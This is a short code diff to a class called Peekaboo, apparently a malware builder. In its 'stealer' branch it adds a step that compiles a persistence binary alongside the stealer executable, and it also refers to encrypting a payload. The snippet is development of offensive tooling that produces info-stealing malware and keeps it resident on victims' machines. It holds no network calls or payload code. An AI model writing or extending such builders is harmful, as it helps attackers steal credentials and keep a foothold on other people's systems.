@@ -733,7 +733,11 @@ class Peekaboo:
 
             if self.malware_type == "stealer":
                 malware_exe = self.build_and_compile_stealer()
-                self._print_instructions(malware_exe, None)
+                persistence_exe = None
+                if self.persistence_type != "none" and malware_exe:
+                    malware_out_dir = self.templates_dir / "stealer" / self.stealer_api
+                    persistence_exe = self.build_persistence_binary(malware_out_dir)
+                self._print_instructions(malware_exe, persistence_exe)
             else:
                 encrypted_payload = self.encrypt_payload()
                 if encrypted_payload is None:
